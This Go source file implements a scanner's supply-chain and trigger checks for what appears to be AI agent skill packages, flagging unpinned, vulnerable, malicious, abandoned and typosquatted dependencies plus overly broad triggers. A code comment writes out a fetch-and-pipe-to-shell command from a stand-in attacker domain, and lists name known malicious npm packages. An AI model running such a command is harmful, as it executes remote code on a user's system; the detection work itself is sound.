// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0
//
// Supply chain (SC1–SC6) and trigger analysis (TR1–TR3) ported from
// static_patterns_supply_chain.py. SC4 uses the static offline fallback list
// (the live OSV.dev lookup from the Python version is not ported in this build).

package scanner

import (
	"regexp"
	"strings"

	"github.com/dlclark/regexp2"
)

var trustedDomains = []string{
	"deb.nodesource.com", "rpm.nodesource.com", "get.docker.com",
	"install.python-poetry.org", "raw.githubusercontent.com", "brew.sh",
	"rustup.rs", "pypa.io", "pip.pypa.io", "astral.sh", "pypi.org",
	"npmjs.com", "github.com",
}

var safeInstallRe = compile(`(?:pip|npm)\s+install`, regexp2.IgnoreCase)

// urlInTextRe extracts URL authorities from a command string so trust can be
// decided by hostname rather than substring.
var urlInTextRe = regexp.MustCompile(`(?i)https?://([^/\s'"]+)`)

// isTrustedSource reports whether every URL host in text belongs to a trusted
// domain. Hostnames are compared by exact match or proper subdomain suffix —
// a substring check would let `https://github.com.evil.tld/x.sh | sh` pose as
// trusted and dodge the install gate.
func isTrustedSource(text string) bool {
	matches := urlInTextRe.FindAllStringSubmatch(text, -1)
	if len(matches) == 0 {
		return false
	}
	for _, m := range matches {
		host := strings.ToLower(m[1])
		if at := strings.LastIndex(host, "@"); at >= 0 {
			host = host[at+1:] // drop any userinfo
		}
		if c := strings.IndexByte(host, ':'); c >= 0 {
			host = host[:c] // drop any port
		}
		trusted := false
		for _, d := range trustedDomains {
			if host == d || strings.HasSuffix(host, "."+d) {
				trusted = true
				break
			}
		}
		if !trusted {
			return false
		}
	}
	return true
}

func isSafeSupplyChainPattern(text string) bool {
	return isTrustedSource(text) || matchString(safeInstallRe, text)
}

// analyzeSupplyChainPatterns implements SC1–SC3 (run per file via runStaticPatterns).
func analyzeSupplyChainPatterns(content, filePath, fileType string) []AnalyzerFinding {
	runes := []rune(content)
	var out []AnalyzerFinding

	lowerPath := strings.ToLower(filePath)
	isDepFile := containsAny(lowerPath, []string{"requirements", "package.json", "pyproject.toml", "setup.py", "pipfile"})

	if isDepFile {
		emit(content, runes, filePath, sc1Pats, "SC1", "Unpinned Dependencies", SeverityLow, catSupplyChain, 3, &out)
	}
	for _, p := range sc2Pats {
		for _, m := range findAll(p.re, content) {
			var conf float64
			var sev Severity
			if isSafeSupplyChainPattern(m.text) {
				conf = minf(p.conf, 0.15)
				sev = SeverityLow
			} else {
				conf = p.conf
				sev = SeverityHigh
			}
			out = append(out, mkAF("SC2", "External Script Fetching", sev, filePath, runes, content, m, conf, catSupplyChain, 3))
		}
	}
	if fileType == "python" || fileType == "javascript" || fileType == "shell" || fileType == "other" {
		emit(content, runes, filePath, sc3Pats, "SC3", "Obfuscated Code", SeverityHigh, catSupplyChain, 3, &out)
	}
	return out
}

func containsAny(s string, subs []string) bool {
	for _, sub := range subs {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

// --- SC4–SC6: dependency-level analysis --------------------------------------

type vulnEntry struct {
	name    string
	maxSafe string // "" means always vulnerable
	info    string
	conf    float64
}

var fallbackVulnPyPI = []vulnEntry{
	{"py", "", "CVE-2022-42969 (ReDoS)", 0.7},
	{"pycrypto", "", "CVE-2013-7459 (heap overflow, unmaintained)", 0.8},
	{"pyyaml", "5.4", "CVE-2020-14343 (arbitrary code execution via yaml.load)", 0.75},
	{"urllib3", "1.26.5", "CVE-2021-33503 (ReDoS)", 0.7},
	{"pillow", "9.0.0", "CVE-2022-22817 (arbitrary code execution)", 0.7},
	{"setuptools", "65.5.1", "CVE-2022-40897 (ReDoS)", 0.65},
	{"certifi", "2022.12.07", "CVE-2023-37920 (removed trust root)", 0.7},
	{"requests", "2.31.0", "CVE-2023-32681 (header leak on redirect)", 0.65},
	{"jinja2", "3.1.3", "CVE-2024-22195 (XSS)", 0.7},
	{"cryptography", "41.0.6", "CVE-2023-49083 (NULL dereference)", 0.7},
	{"django", "4.2.7", "CVE-2023-46695 (DoS)", 0.7},
	{"flask", "2.3.2", "CVE-2023-30861 (session cookie)", 0.65},
	{"tornado", "6.3.3", "CVE-2023-28370 (open redirect)", 0.65},
	{"aiohttp", "3.8.6", "CVE-2023-47627 (HTTP request smuggling)", 0.7},
	{"paramiko", "3.4.0", "CVE-2023-48795 (Terrapin SSH)", 0.75},
}

var fallbackVulnNPM = []vulnEntry{
	{"event-stream", "", "Malicious package (credential theft)", 0.95},
	{"flatmap-stream", "", "Malicious package (cryptocurrency theft)", 0.95},
	{"ua-parser-js", "0.7.31", "Malicious versions (cryptominer)", 0.85},
	{"coa", "2.0.2", "Malicious versions (credential theft)", 0.85},
	{"rc", "1.2.8", "Malicious versions (credential theft)", 0.85},
	{"colors", "1.4.0", "Protestware (infinite loop)", 0.8},
	{"faker", "5.5.3", "Protestware (infinite loop)", 0.8},
	{"node-ipc", "10.1.0", "Protestware (destructive payload)", 0.9},
	{"lodash", "4.17.21", "CVE-2021-23337 (prototype pollution)", 0.65},
}

var abandonedPackages = toSet([]string{
	"pycrypto", "nose", "optparse", "distribute", "mimetools", "multifile",
	"popen2", "rfc822", "sets", "sha", "md5", "commands", "dircache",
	"fpformat", "htmllib", "ihooks", "linuxaudiodev", "mhlib", "mimify",
	"mutex", "new", "posixfile", "pre", "regsub", "sgmllib", "stat",
	"statvfs", "stringold", "sunaudiodev", "sv", "timing", "toaiff", "user",
	"xmllib", "request", "nomnom", "optimist", "dominion", "npm-conf",
})

var popularPyPI = toSet([]string{
	"requests", "numpy", "pandas", "flask", "django", "boto3", "setuptools",
	"pip", "urllib3", "pyyaml", "cryptography", "pillow", "pydantic",
	"sqlalchemy", "pytest", "click", "jinja2", "httpx", "aiohttp", "fastapi",
	"celery", "paramiko", "beautifulsoup4", "lxml", "scrapy", "redis",
	"pymongo", "psycopg2", "matplotlib", "scipy", "scikit-learn",
	"tensorflow", "torch", "keras", "transformers", "openai", "langchain",
	"gunicorn", "uvicorn", "rich", "typer", "black", "ruff", "mypy",
	"pylint", "flake8", "isort",
})

var popularNPM = toSet([]string{
	"express", "react", "react-dom", "next", "vue", "angular", "lodash",
	"axios", "moment", "chalk", "commander", "inquirer", "webpack", "babel",
	"eslint", "prettier", "typescript", "jest", "mocha", "chai", "puppeteer",
	"socket.io", "mongoose", "sequelize", "passport", "jsonwebtoken",
	"dotenv", "cors", "body-parser", "nodemon", "pm2",
})

func toSet(items []string) map[string]bool {
	m := make(map[string]bool, len(items))
	for _, it := range items {
		m[it] = true
	}
	return m
}

func normalizePkg(name string) string {
	return strings.ReplaceAll(strings.ToLower(name), "_", "-")
}

func editDistance(a, b string) int {
	ra, rb := []rune(a), []rune(b)
	if len(ra) < len(rb) {
		ra, rb = rb, ra
	}
	if len(rb) == 0 {
		return len(ra)
	}
	prev := make([]int, len(rb)+1)
	for j := range prev {
		prev[j] = j
	}
	for i := 0; i < len(ra); i++ {
		curr := make([]int, len(rb)+1)
		curr[0] = i + 1
		for j := 0; j < len(rb); j++ {
			cost := 1
			if ra[i] == rb[j] {
				cost = 0
			}
			curr[j+1] = min3(curr[j]+1, prev[j+1]+1, prev[j]+cost)
		}
		prev = curr
	}
	return prev[len(rb)]
}

func min3(a, b, c int) int {
	m := a
	if b < m {
		m = b
	}
	if c < m {
		m = c
	}
	return m
}

func isTyposquat(pkgName string, popular map[string]bool) string {
	normalized := normalizePkg(pkgName)
	for popName := range popular {
		popNorm := normalizePkg(popName)
		if normalized == popNorm {
			return ""
		}
		if len(normalized) < 3 || len(popNorm) < 3 {
			continue
		}
		dist := editDistance(normalized, popNorm)
		if dist > 0 && dist <= 2 {
			return popName
		}
	}
	return ""
}

type depPkg struct {
	name    string
	version string // "" means unpinned
	line    int
}

var reqLineRe = regexp.MustCompile(`^([a-zA-Z][a-zA-Z0-9._-]*)(?:\[.*?\])?\s*(?:([=<>!~]=?)\s*([\d.*]+))?`)

func extractPackagesFromRequirements(content string) []depPkg {
	var out []depPkg
	for i, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "-") {
			continue
		}
		m := reqLineRe.FindStringSubmatch(line)
		if m != nil {
			version := ""
			if m[2] == "==" || m[2] == "<=" {
				version = m[3]
			}
			out = append(out, depPkg{name: m[1], version: version, line: i + 1})
		}
	}
	return out
}

var depsHeaderRe = regexp.MustCompile(`"(?:dependencies|devDependencies|peerDependencies)"`)
var pkgJSONLineRe = regexp.MustCompile(`"([^"]+)"\s*:\s*"([^"]*)"`)
var startsDigitRe = regexp.MustCompile(`^\d`)

func extractPackagesFromPackageJSON(content string) []depPkg {
	var out []depPkg
	inDeps := false
	for i, line := range strings.Split(content, "\n") {
		stripped := strings.TrimSpace(line)
		if depsHeaderRe.MatchString(stripped) {
			inDeps = true
			continue
		}
		if inDeps && strings.HasPrefix(stripped, "}") {
			inDeps = false
			continue
		}
		if inDeps {
			m := pkgJSONLineRe.FindStringSubmatch(stripped)
			if m != nil {
				verStr := strings.TrimLeft(m[2], "^~>=<")
				version := ""
				if startsDigitRe.MatchString(verStr) {
					version = verStr
				}
				out = append(out, depPkg{name: m[1], version: version, line: i + 1})
			}
		}
	}
	return out
}

var digitsRe = regexp.MustCompile(`\d+`)

func versionLT(v1, v2 string) bool {
	p1 := digitsRe.FindAllString(v1, -1)
	p2 := digitsRe.FindAllString(v2, -1)
	n := len(p1)
	if len(p2) > n {
		n = len(p2)
	}
	for i := 0; i < n; i++ {
		var a, b int
		if i < len(p1) {
			a = atoiSafe(p1[i])
		}
		if i < len(p2) {
			b = atoiSafe(p2[i])
		}
		if a != b {
			return a < b
		}
	}
	return false
}

func atoiSafe(s string) int {
	n := 0
	for _, r := range s {
		if r < '0' || r > '9' {
			return n
		}
		n = n*10 + int(r-'0')
	}
	return n
}

func analyzeDependencies(content, filePath string) []AnalyzerFinding {
	var out []AnalyzerFinding
	tag := catSupplyChain
	lowerPath := strings.ToLower(filePath)
	isPython := containsAny(lowerPath, []string{"requirements", "pyproject.toml", "setup.py", "pipfile"})
	isNPM := strings.Contains(lowerPath, "package.json")
	if !isPython && !isNPM {
		return out
	}

	var packages []depPkg
	var fallbackDB []vulnEntry
	var popular map[string]bool
	if isPython {
		packages = extractPackagesFromRequirements(content)
		fallbackDB = fallbackVulnPyPI
		popular = popularPyPI
	} else {
		packages = extractPackagesFromPackageJSON(content)
		fallbackDB = fallbackVulnNPM
		popular = popularNPM
	}

	// SC4: static fallback (offline) — the live OSV.dev lookup is not ported.
	for _, pkg := range packages {
		pkgLower := normalizePkg(pkg.name)
		for _, v := range fallbackDB {
			if pkgLower != normalizePkg(v.name) {
				continue
			}
			if v.maxSafe == "" {
				out = append(out, AnalyzerFinding{
					RuleID: "SC4", Message: "Known Vulnerable Dependency: " + pkg.name + " (" + v.info + ")",
					Severity: SeverityHigh, Location: Location{File: filePath, StartLine: pkg.line},
					Confidence: v.conf, Tags: []string{tag}, MatchedText: pkg.name,
				})
			} else if pkg.version != "" && versionLT(pkg.version, v.maxSafe) {
				out = append(out, AnalyzerFinding{
					RuleID: "SC4", Message: "Known Vulnerable Dependency: " + pkg.name + "==" + pkg.version + " (fix: >=" + v.maxSafe + ", " + v.info + ")",
					Severity: SeverityHigh, Location: Location{File: filePath, StartLine: pkg.line},
					Confidence: v.conf, Tags: []string{tag}, MatchedText: pkg.name + "==" + pkg.version,
				})
			}
		}
	}

	for _, pkg := range packages {
		pkgLower := normalizePkg(pkg.name)
		if abandonedPackages[pkgLower] {
			out = append(out, AnalyzerFinding{
				RuleID: "SC5", Message: "Abandoned Dependency: " + pkg.name + " is unmaintained and no longer receives security updates",
				Severity: SeverityMedium, Location: Location{File: filePath, StartLine: pkg.line},
				Confidence: 0.75, Tags: []string{tag}, MatchedText: pkg.name,
			})
		}
		if similar := isTyposquat(pkg.name, popular); similar != "" {
			out = append(out, AnalyzerFinding{
				RuleID: "SC6", Message: "Possible Typosquatting: '" + pkg.name + "' resembles popular package '" + similar + "'",
				Severity: SeverityHigh, Location: Location{File: filePath, StartLine: pkg.line},
				Confidence: 0.7, Tags: []string{tag}, MatchedText: pkg.name,
			})
		}
	}
	return out
}

// --- TR1–TR3: trigger analysis -----------------------------------------------

var builtinCommands = toSet([]string{
	"help", "search", "find", "run", "test", "build", "deploy", "install",
	"create", "delete", "update", "list", "show", "get", "set", "open",
	"close", "start", "stop", "restart", "status", "log", "debug", "commit",
	"push", "pull", "merge", "branch", "checkout", "rebase", "diff", "blame",
	"stash", "tag", "release", "version", "lint", "format", "fix", "refactor",
	"review", "explain", "chat", "ask", "edit", "write", "read", "save",
	"load", "copy", "move",
})

var overlyBroadSingleWords = toSet([]string{
	"the", "a", "an", "is", "it", "do", "go", "make", "thing", "stuff",
	"code", "file", "data", "text", "work", "good", "bad", "yes", "no",
	"ok", "please", "thanks", "hi", "hello", "hey",
})

var baitingRes = []*regexp2.Regexp{
	compile(`^(?:anything|everything|whatever|always|any\s+(?:question|request|task|input))$`, regexp2.None),
	compile(`^(?:when(?:ever)?|if|every\s+time)\s+(?:the\s+)?user\s+(?:says?|asks?|types?|sends?)\s+(?:anything|something|a\s+message)$`, regexp2.None),
	compile(`^(?:all|any|every)\s+(?:messages?|inputs?|requests?|queries?|questions?)$`, regexp2.None),
}

func analyzeTriggers(m *manifestData) []Finding {
	if len(m.Triggers) == 0 {
		return nil
	}
	var out []Finding
	tag := catTriggerAbuse
	fileRef := "SKILL.md"
	for i, trigger := range m.Triggers {
		line := i + 1
		t := strings.TrimSpace(trigger)
		if t == "" {
			continue
		}
		triggerLower := strings.ToLower(t)
		words := strings.Fields(triggerLower)

		if len(words) == 1 && overlyBroadSingleWords[triggerLower] {
			out = append(out, mkTriggerFinding("TR1", "Overly Broad Trigger: '"+trigger+"' is a common word that will activate in many unintended contexts", "LOW", 0.75, fileRef, line, trigger, tag, "Overly Broad Trigger"))
		} else if len([]rune(triggerLower)) <= 2 {
			out = append(out, mkTriggerFinding("TR1", "Overly Broad Trigger: '"+trigger+"' is too short and may match unintended inputs", "LOW", 0.7, fileRef, line, trigger, tag, "Overly Broad Trigger"))
		}

		if builtinCommands[triggerLower] || (len(words) > 0 && builtinCommands[words[0]] && len(words) <= 2) {
			first := ""
			if len(words) > 0 {
				first = words[0]
			}
			out = append(out, mkTriggerFinding("TR2", "Shadow Command Trigger: '"+trigger+"' conflicts with built-in command '"+first+"'", "MEDIUM", 0.7, fileRef, line, trigger, tag, "Shadow Command Trigger"))
		}

		for _, re := range baitingRes {
			if matchString(re, triggerLower) {
				out = append(out, mkTriggerFinding("TR3", "Keyword Baiting Trigger: '"+trigger+"' is designed to match all or most user inputs", "MEDIUM", 0.8, fileRef, line, trigger, tag, "Keyword Baiting Trigger"))
				break
			}
		}
	}
	return out
}

func mkTriggerFinding(ruleID, message, severity string, conf float64, file string, line int, matched, tag, pattern string) Finding {
	return Finding{
		RuleID: ruleID, Message: message, Severity: severity, Confidence: conf,
		File: file, StartLine: line, Tags: []string{tag},
		MatchedText: matched, Category: catTriggerAbuse, Pattern: pattern,
	}
}

// supplyChainAnalyzer is the registry entry: SC1–SC3 + SC4–SC6 + TR1–TR3.
func supplyChainAnalyzer(st *scanState) []Finding {
	findings := runStaticPatterns(st, analyzeSupplyChainPatterns)
	for _, path := range st.Components {
		lowerPath := strings.ToLower(path)
		if !containsAny(lowerPath, []string{"requirements", "package.json", "pyproject.toml", "setup.py", "pipfile"}) {
			continue
		}
		content := st.FileCache[path]
		if content == "" {
			continue
		}
		for _, af := range analyzeDependencies(content, path) {
			findings = append(findings, analyzerFindingToFinding(af))
		}
	}
	if st.Manifest.present {
		findings = append(findings, analyzeTriggers(&st.Manifest)...)
	}
	return findings
}
